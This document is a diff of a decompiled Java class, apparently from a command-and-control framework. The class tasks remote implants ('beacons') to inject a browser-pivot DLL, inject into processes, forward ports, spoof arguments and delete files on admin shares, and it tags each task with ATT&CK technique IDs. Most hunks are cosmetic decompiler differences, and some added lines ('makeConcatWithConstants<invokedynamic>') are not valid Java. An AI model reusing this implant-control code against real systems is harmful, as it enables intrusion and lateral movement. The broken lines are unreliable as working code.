@@ -161,6 +161,7 @@ public class TaskBeacon {
       if (!this.silent) {
          this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Task(var1, var2, var3)));
       }
+
    }
 
    public void input(String var1) {
@@ -346,7 +347,7 @@ public class TaskBeacon {
       byte[] var7 = this.builder.build();
       this.log_task(var1, "Injecting browser pivot DLL into " + var2, "T1111, T1055, T1185");
       this.conn.call("beacons.task", CommonUtils.args(var1, var7));
-      this.conn.call("browserpivot.start", CommonUtils.args(var1, var4 + "", var5 + ""));
+      this.conn.call("browserpivot.start", CommonUtils.args(var1, var4.makeConcatWithConstants<invokedynamic>(var4), var5.makeConcatWithConstants<invokedynamic>(var5)));
       this.GoInteractive(var1);
       this.conn.call("beacons.portfwd", CommonUtils.args(var1, "127.0.0.1", var5));
    }
@@ -406,7 +407,9 @@ public class TaskBeacon {
 
    public void Cancel(String var1) {
       for(int var2 = 0; var2 < this.bids.length; ++var2) {
-         this.log_task(this.bids[var2], "Tasked " + CommonUtils.session(this.bids[var2]) + " to cancel downloads that match " + var1);
+         String var10001 = this.bids[var2];
+         String var10002 = CommonUtils.session(this.bids[var2]);
+         this.log_task(var10001, "Tasked " + var10002 + " to cancel downloads that match " + var1);
          this.conn.call("beacons.download_cancel", CommonUtils.args(this.bids[var2], var1));
       }
 
@@ -418,7 +421,9 @@ public class TaskBeacon {
 
    public void Clear() {
       for(int var1 = 0; var1 < this.bids.length; ++var1) {
-         this.log_task(this.bids[var1], "Cleared " + CommonUtils.session(this.bids[var1]) + " queue");
+         String var10001 = this.bids[var1];
+         String var10002 = this.bids[var1];
+         this.log_task(var10001, "Cleared " + CommonUtils.session(var10002) + " queue");
          this.conn.call("beacons.clear", CommonUtils.args(this.bids[var1]));
       }
 
@@ -445,7 +450,7 @@ public class TaskBeacon {
 
    public String file_to_tactic(String var1) {
       var1 = var1.toLowerCase();
-      return !var1.startsWith("\\\\") || !CommonUtils.isin("\\C$", var1) && !CommonUtils.isin("\\ADMIN$", var1) ? "" : "T1077";
+      return var1.startsWith("\\\\") && (CommonUtils.isin("\\C$", var1) || CommonUtils.isin("\\ADMIN$", var1)) ? "T1077" : "";
    }
 
    public void BlockDLLs(boolean var1) {
@@ -496,6 +501,7 @@ public class TaskBeacon {
             }
          }
       }
+
    }
 
    public void CovertVPN(String var1, String var2) {
@@ -534,7 +540,9 @@ public class TaskBeacon {
       byte[] var1 = this.builder.build();
 
       for(int var2 = 0; var2 < this.bids.length; ++var2) {
-         this.log_task(this.bids[var2], "Tasked " + CommonUtils.session(this.bids[var2]) + " to exit");
+         String var10001 = this.bids[var2];
+         String var10002 = this.bids[var2];
+         this.log_task(var10001, "Tasked " + CommonUtils.session(var10002) + " to exit");
          this.conn.call("beacons.task", CommonUtils.args(this.bids[var2], var1));
       }
 
@@ -561,8 +569,8 @@ public class TaskBeacon {
             this.log_task(this.bids[var6], "Tasked beacon to inject " + var2 + " into " + var1, "T1055");
             this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));
          }
-
       }
+
    }
 
    public void DllLoad(int var1, String var2) {
@@ -644,8 +652,8 @@ public class TaskBeacon {
                (new ExecuteAssemblyJob(this, var1, var2, "x86")).spawn(this.bids[var4]);
             }
          }
-
       }
+
    }
 
    public void GetPrivs() {
@@ -1019,7 +1027,9 @@ public class TaskBeacon {
       byte[] var2 = this.builder.build();
 
       for(int var3 = 0; var3 < this.bids.length; ++var3) {
-         this.log_task(this.bids[var3], "Tasked " + CommonUtils.session(this.bids[var3]) + " to accept TCP Beacon sessions on port " + var1, "T1090");
+         String var10001 = this.bids[var3];
+         String var10002 = CommonUtils.session(this.bids[var3]);
+         this.log_task(var10001, "Tasked " + var10002 + " to accept TCP Beacon sessions on port " + var1, "T1090");
          this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));
       }
 
@@ -1042,7 +1052,9 @@ public class TaskBeacon {
 
       for(int var5 = 0; var5 < this.bids.length; ++var5) {
          this.conn.call("beacons.rportfwd", CommonUtils.args(this.bids[var5], var1, var2, var3));
-         this.log_task(this.bids[var5], "Tasked " + CommonUtils.session(this.bids[var5]) + " to forward port " + var1 + " to " + var2 + ":" + var3, "T1090");
+         String var10001 = this.bids[var5];
+         String var10002 = CommonUtils.session(this.bids[var5]);
+         this.log_task(var10001, "Tasked " + var10002 + " to forward port " + var1 + " to " + var2 + ":" + var3, "T1090");
          this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));
       }
 
@@ -1056,7 +1068,9 @@ public class TaskBeacon {
 
       for(int var5 = 0; var5 < this.bids.length; ++var5) {
          this.conn.call("beacons.rportfwd_local", CommonUtils.args(this.bids[var5], var1, var2, var3));
-         this.log_task(this.bids[var5], "Tasked " + CommonUtils.session(this.bids[var5]) + " to forward port " + var1 + " to " + DataUtils.getNick(this.client.getData()) + " -> " + var2 + ":" + var3, "T1090");
+         String var10001 = this.bids[var5];
+         String var10002 = CommonUtils.session(this.bids[var5]);
+         this.log_task(var10001, "Tasked " + var10002 + " to forward port " + var1 + " to " + DataUtils.getNick(this.client.getData()) + " -> " + var2 + ":" + var3, "T1090");
          this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));
       }
 
@@ -1068,9 +1082,11 @@ public class TaskBeacon {
       byte[] var2 = this.builder.build();
 
       for(int var3 = 0; var3 < this.bids.length; ++var3) {
-         this.log_task(this.bids[var3], "Tasked " + CommonUtils.session(this.bids[var3]) + " to stop port forward on " + var1);
+         String var10001 = this.bids[var3];
+         String var10002 = CommonUtils.session(this.bids[var3]);
+         this.log_task(var10001, "Tasked " + var10002 + " to stop port forward on " + var1);
          this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));
-         this.client.getConnection().call("beacons.pivot_stop_port", CommonUtils.args(this.bids[var3], var1 + ""));
+         this.client.getConnection().call("beacons.pivot_stop_port", CommonUtils.args(this.bids[var3], var1.makeConcatWithConstants<invokedynamic>(var1)));
       }
 
    }
@@ -1415,10 +1431,13 @@ public class TaskBeacon {
             this.builder.setCommand(56);
             this.builder.addString(var3);
             byte[] var5 = this.builder.build();
-            this.log_task(var1, "Tasked beacon to remove " + var2, "T1107, " + this.file_to_tactic(var2));
+            String var10002 = "Tasked beacon to remove " + var2;
+            String var10003 = this.file_to_tactic(var2);
+            this.log_task(var1, var10002, "T1107, " + var10003);
             this.conn.call("beacons.task", CommonUtils.args(var1, var5));
          }
       }
+
    }
 
    public void Run(String var1) {
@@ -1536,16 +1555,24 @@ public class TaskBeacon {
          BeaconEntry var5 = DataUtils.getEgressBeacon(this.data, this.bids[var4]);
          BeaconEntry var6 = DataUtils.getBeacon(this.data, this.bids[var4]);
          if (var5 != null && var6 != null && !var5.getId().equals(this.bids[var4])) {
+            String var10001;
+            String var10002;
             if (var1 == 0) {
-               this.log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to become interactive [change made to: " + var5.title() + "]");
+               var10001 = this.bids[var4];
+               var10002 = CommonUtils.session(this.bids[var4]);
+               this.log_task(var10001, "Tasked " + var10002 + " to become interactive [change made to: " + var5.title() + "]");
                this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep 0 [from: " + var6.title() + "]")));
                this.log_task(var5.getId(), "Tasked beacon to become interactive", "T1029");
             } else if (var2 == 0) {
-               this.log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to sleep for " + var1 + "s [change made to: " + var5.title() + "]");
+               var10001 = this.bids[var4];
+               var10002 = CommonUtils.session(this.bids[var4]);
+               this.log_task(var10001, "Tasked " + var10002 + " to sleep for " + var1 + "s [change made to: " + var5.title() + "]");
                this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep " + var1 + "s [from: " + var6.title() + "]")));
                this.log_task(var5.getId(), "Tasked beacon to sleep for " + var1 + "s", "T1029");
             } else {
-               this.log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to sleep for " + var1 + "s (" + var2 + "% jitter) [change made to: " + var5.title() + "]");
+               var10001 = this.bids[var4];
+               var10002 = CommonUtils.session(this.bids[var4]);
+               this.log_task(var10001, "Tasked " + var10002 + " to sleep for " + var1 + "s (" + var2 + "% jitter) [change made to: " + var5.title() + "]");
                this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep " + var1 + " " + var2 + " [from: " + var6.title() + "]")));
                this.log_task(var5.getId(), "Tasked beacon to sleep for " + var1 + "s (" + var2 + "% jitter)", "T1029");
             }
@@ -1660,10 +1687,13 @@ public class TaskBeacon {
          this.client.getTunnelManager().allow(var3, var4);
       }
 
+      String var10002;
       if (var6) {
-         this.log_task(var1, "Tasked " + CommonUtils.session(var1) + " to spawn " + CommonUtils.getFileName(var5) + " (" + var2 + ") and forward 127.0.0.1:" + var4 + " to " + DataUtils.getNick(this.client.getData()) + " -> " + var3 + ":" + var4, "T1090");
+         var10002 = CommonUtils.session(var1);
+         this.log_task(var1, "Tasked " + var10002 + " to spawn " + CommonUtils.getFileName(var5) + " (" + var2 + ") and forward 127.0.0.1:" + var4 + " to " + DataUtils.getNick(this.client.getData()) + " -> " + var3 + ":" + var4, "T1090");
       } else {
-         this.log_task(var1, "Tasked " + CommonUtils.session(var1) + " to spawn " + CommonUtils.getFileName(var5) + " (" + var2 + ") and forward 127.0.0.1:" + var4 + " to " + var3 + ":" + var4, "T1090");
+         var10002 = CommonUtils.session(var1);
+         this.log_task(var1, "Tasked " + var10002 + " to spawn " + CommonUtils.getFileName(var5) + " (" + var2 + ") and forward 127.0.0.1:" + var4 + " to " + var3 + ":" + var4, "T1090");
       }
 
       if (var6) {
@@ -1758,7 +1788,7 @@ public class TaskBeacon {
 
    public void SpoofArgsRemove(String var1) {
       this.builder.setCommand(84);
-      this.builder.addString(var1 + '\u0000');
+      this.builder.addString(var1 + "\u0000");
       byte[] var2 = this.builder.build();
 
       for(int var3 = 0; var3 < this.bids.length; ++var3) {
@@ -1909,7 +1939,7 @@ public class TaskBeacon {
       Iterator var7 = var6.iterator();
 
       while(var7.hasNext()) {
-         byte[] var8 = (byte[])((byte[])var7.next());
+         byte[] var8 = (byte[])var7.next();
          this.conn.call("beacons.task", CommonUtils.args(var1, var8));
       }
 
